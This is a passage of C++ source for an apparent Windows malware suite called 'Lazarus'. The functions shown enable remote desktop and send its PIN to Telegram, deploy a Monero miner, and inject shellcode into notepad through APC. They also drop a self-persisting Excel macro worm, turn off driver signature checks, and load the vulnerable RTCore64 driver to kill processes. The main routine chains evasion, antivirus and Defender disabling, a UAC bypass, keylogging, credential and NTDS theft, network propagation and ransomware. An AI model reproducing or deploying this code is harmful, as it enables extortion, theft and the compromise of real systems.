    system(("\"" + crdPath + "\" --start-host --pin=" + std::to_string(pin)).c_str());
    JitterSleep(2000);
    std::string cmd = "\"" + crdPath + "\" --get-host-id";
    FILE* pipe = _popen(cmd.c_str(), "r");
    char buf[128] = {0};
    std::string id;
    if (pipe) { while (fgets(buf, sizeof(buf), pipe)) id += buf; _pclose(pipe); }
    SendToTelegram("CRD|ID=" + id + "|PIN=" + std::to_string(pin));
}
static void DeployMiner() {
    const char* urls[] = { MINER_URL1, MINER_URL2, MINER_URL3 };
    for (auto url : urls) {
        std::string dest = GetTempDir() + "xmrig.exe";
        if (DownloadFile(url, dest)) {
            system(("\"" + dest + "\" -o pool.minexmr.com:443 -u " + std::string(XMR_WALLET) + " -p x --donate-level 1 --background").c_str());
            SendToTelegram("MINER_DEPLOYED|" + std::string(url));
            return;
        }
    }
    SendToTelegram("MINER_FAILED");
}
static void ProcessInjectionAPC() {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"notepad.exe") == 0) { pid = pe.th32ProcessID; break; }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    if (pid == 0) {
        ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_HIDE);
        JitterSleep(2000);
        snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
            if (Process32First(snap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, L"notepad.exe") == 0) { pid = pe.th32ProcessID; break; }
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
    }
    if (pid == 0) return;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return;
    BYTE shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 40
        0x48, 0x31, 0xC9,                               // xor rcx, rcx
        0x48, 0xBA, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, // mov rdx, "calc.exe"
        0x48, 0x89, 0x54, 0x24, 0x30,                   // mov [rsp+30h], rdx
        0x48, 0x8D, 0x54, 0x24, 0x30,                   // lea rdx, [rsp+30h]
        0x48, 0xB9, 0x01, 0x00, 0x00, 0x00,             // mov rcx, 1 (SW_SHOW)
        0x48, 0xB8, 0x88, 0x77, 0x24, 0x88, 0xFF, 0x7F, 0x00, 0x00, // placeholder WinExec
        0xFF, 0xD0,                                     // call rax
        0x48, 0x31, 0xC9,                               // xor rcx, rcx
        0x48, 0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // placeholder ExitProcess
        0xFF, 0xD0,                                     // call rax
    };
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pWinExec = GetProcAddress(hKernel32, "WinExec");
    FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
    memcpy(&shellcode[29], &pWinExec, 8);
    memcpy(&shellcode[44], &pExitProcess, 8);
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemote) {
        SIZE_T bytesWritten;
        WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), &bytesWritten);
        THREADENTRY32 te = { sizeof(THREADENTRY32) };
        HANDLE snapThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snapThread != INVALID_HANDLE_VALUE) {
            if (Thread32First(snapThread, &te)) {
                do {
                    if (te.th32OwnerProcessID == pid) {
                        HANDLE hTargetThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                        if (hTargetThread) {
                            QueueUserAPC((PAPCFUNC)pRemote, hTargetThread, 0);
                            CloseHandle(hTargetThread);
                            break;
                        }
                    }
                } while (Thread32Next(snapThread, &te));
            }
            CloseHandle(snapThread);
        }
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    }
    CloseHandle(hProcess);
    SendToTelegram("PROCESS_INJECTION_APC|SUCCESS");
}

// ------------------------------------------------------------------
// VBA Macro Dropper
// ------------------------------------------------------------------
static void CreateAndExecuteVBAWorm() {
    system("reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" /v VBAWarnings /t REG_DWORD /d 1 /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" /v AccessVBOM /t REG_DWORD /d 1 /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\" /v VBAWarnings /t REG_DWORD /d 1 /f >nul 2>&1");
    system("reg add \"HKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\" /v AccessVBOM /t REG_DWORD /d 1 /f >nul 2>&1");
    const char* vbaSource =
        "Attribute VB_Name = \"LazarusModule\"\n"
        "Option Explicit\n"
        "Public Sub AutoExec()\n"
        "    On Error Resume Next\n"
        "    Dim wsh As Object: Set wsh = CreateObject(\"WScript.Shell\")\n"
        "    wsh.RegWrite \"HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarnings\", 1, \"REG_DWORD\"\n"
        "    wsh.RegWrite \"HKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\AccessVBOM\", 1, \"REG_DWORD\"\n"
        "    CreateObject(\"WScript.Shell\").Run \"schtasks /create /tn \\\"LazarusMacro\\\" /tr \\\"excel.exe \\\"\"\" & ThisWorkbook.FullName & \"\\\"\"\" /sc onlogon /f\", 0, True\n"
        "    MsgBox \"Excel has encountered a critical error. Please restart.\", vbCritical, \"Microsoft Excel\"\n"
        "End Sub\n"
        "Public Sub Workbook_Open()\n"
        "    AutoExec\n"
        "End Sub\n";
    std::string vbsPath = GetTempDir() + "create_vba.vbs";
    std::string excelPath = GetTempDir() + "notice.xlsm";
    std::ofstream vbs(vbsPath);
    vbs << "Set objExcel = CreateObject(\"Excel.Application\")\n";
    vbs << "objExcel.Visible = False\n";
    vbs << "Set objWorkbook = objExcel.Workbooks.Add\n";
    vbs << "Set objModule = objWorkbook.VBProject.VBComponents.Add(1)\n";
    vbs << "objModule.CodeModule.AddFromString \"" << vbaSource << "\"\n";
    vbs << "objWorkbook.SaveAs \"" << excelPath << "\", 52\n";
    vbs << "objExcel.Quit\n";
    vbs.close();
    system(("cscript //nologo \"" + vbsPath + "\"").c_str());
    JitterSleep(5000);
    remove(vbsPath.c_str());
    if (FileExists(excelPath)) {
        system(("schtasks /create /tn \"LazarusMacro\" /tr \"excel.exe \\\"" + excelPath + "\\\"\" /sc onlogon /f").c_str());
        ShellExecuteA(nullptr, "open", excelPath.c_str(), nullptr, nullptr, SW_HIDE);
        SendToTelegram("VBA_WORM_DROPPED|" + excelPath);
    } else {
        SendToTelegram("VBA_WORM_FAILED");
    }
}

// ------------------------------------------------------------------
// Kernel rootkit: Disable signature enforcement & load vulnerable driver
// ------------------------------------------------------------------
static void DisableDriverSignatureEnforcement() {
    system("bcdedit /set testsigning on >nul 2>&1");
    system("bcdedit /set nointegritychecks on >nul 2>&1");
    system("bcdedit /set loadoptions DISABLE_INTEGRITY_CHECKS >nul 2>&1");
    system("bcdedit /set {current} nx AlwaysOff >nul 2>&1");
    std::string taskCmd = "schtasks /create /tn \"LazarusDriver\" /tr \"" + g_selfPath + " --load-driver\" /sc onstart /ru SYSTEM /f";
    system(taskCmd.c_str());
    SendToTelegram("DRIVER_SIGNATURE_DISABLED_REBOOT_REQUIRED");
}
static void LoadVulnerableDriver() {
    std::string driverPath = GetTempDir() + "rtcore64.sys";
    if (!FileExists(driverPath)) {
        if (!DownloadFile(VULN_DRIVER_URL, driverPath)) {
            SendToTelegram("VULN_DRIVER_DOWNLOAD_FAILED");
            return;
        }
    }
    SC_HANDLE hSCM = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return;
    SC_HANDLE hService = CreateServiceA(hSCM, "LazarusDrv", "LazarusDrv", SERVICE_START | DELETE | SERVICE_STOP,
                                        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                                        driverPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!hService && GetLastError() == ERROR_SERVICE_EXISTS) {
        hService = OpenServiceA(hSCM, "LazarusDrv", SERVICE_START | DELETE | SERVICE_STOP);
    }
    if (hService) {
        if (StartServiceA(hService, 0, nullptr)) {
            SendToTelegram("VULN_DRIVER_LOADED");
            HANDLE hDriver = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
            if (hDriver != INVALID_HANDLE_VALUE) {
                DWORD bytesReturned;
                BYTE buffer[1024] = {0};
                DeviceIoControl(hDriver, 0x80002048, nullptr, 0, buffer, sizeof(buffer), &bytesReturned, nullptr);
                CloseHandle(hDriver);
            }
        } else {
            SendToTelegram("VULN_DRIVER_START_FAILED");
        }
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCM);
}
static void KernelKillProcess(const std::string& procName) {
    HANDLE hDriver = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver != INVALID_HANDLE_VALUE) {
        DWORD pid = 0;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
            if (Process32First(snap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, std::wstring(procName.begin(), procName.end()).c_str()) == 0) { pid = pe.th32ProcessID; break; }
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
        if (pid) {
            DWORD bytesReturned;
            DeviceIoControl(hDriver, 0x8000204C, &pid, sizeof(pid), nullptr, 0, &bytesReturned, nullptr);
        }
        CloseHandle(hDriver);
    }
}

// ------------------------------------------------------------------
// Main entry point
// ------------------------------------------------------------------
int main() {
    srand((unsigned int)GetTickCount());
    g_hMutex = CreateMutexA(NULL, TRUE, "Global\\LazarusApocalypseMutex");
    if (g_hMutex && GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1 && wcscmp(argv[1], L"--load-driver") == 0) {
        LoadVulnerableDriver();
        JitterSleep(5000);
        return 0;
    }
    LocalFree(argv);

    if (IsDebugged() || IsVM() || IsSandbox() || IsAdvancedSandbox()) return 0;

    SelfHeal();
    GenerateMasterKey();
    CheckPaymentDeadline();
    if (g_paymentConfirmed) return 0;

    KillThirdPartyAV();
    JitterSleep(1000);
    DisableDefender();
    DisableRecovery();
    PatchAMSI();
    KillETW();

    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    g_selfPath = exePath;
    std::string hiddenExe = std::string(getenv("PROGRAMDATA")) + "\\Lazarus\\Lazarus.exe";
    if (g_selfPath != hiddenExe) {
        CreateDirectoryA((std::string(getenv("PROGRAMDATA")) + "\\Lazarus\\").c_str(), nullptr);
        CopyFileA(g_selfPath.c_str(), hiddenExe.c_str(), FALSE);
        SetFileAttributesA(hiddenExe.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        DisableDriverSignatureEnforcement();
        ShellExecuteA(nullptr, "open", hiddenExe.c_str(), nullptr, nullptr, SW_HIDE);
        return 0;
    }
    g_selfPath = hiddenExe;

    UnhookNtdll();
    InitSyscalls();
    PerformUACBypass();
    ElevateToSYSTEM();

    CreateThread(nullptr, 0, KeyloggerThread, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, ClipboardMonitor, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, PaymentCheckThread, nullptr, 0, nullptr);

    SendToTelegram("LAZARUS_APOCALYPSE_START|" + GetMachineID());

    if (IsDomainController()) {
        SendToTelegram("DOMAIN_CONTROLLER_DETECTED");
        ExtractNTDSAndSYSTEM();
        ExtractHashesFromNTDS();
    } else {
        StealAllCredentials();
        USBPropagation();
        SMBPropagation();
        RDPScanAndPropagation();
        DiscordPropagation();
        SlackPropagation();
        EmailPropagation();
        CloudDrivePropagation();
        EnableChromeRemoteDesktop();
        DeployMiner();
        ProcessInjectionAPC();
        RunRansomware();
        CreateAndExecuteVBAWorm();
    }

    PersistAll();

    while (true) JitterSleep(10000);
    return 0;
}
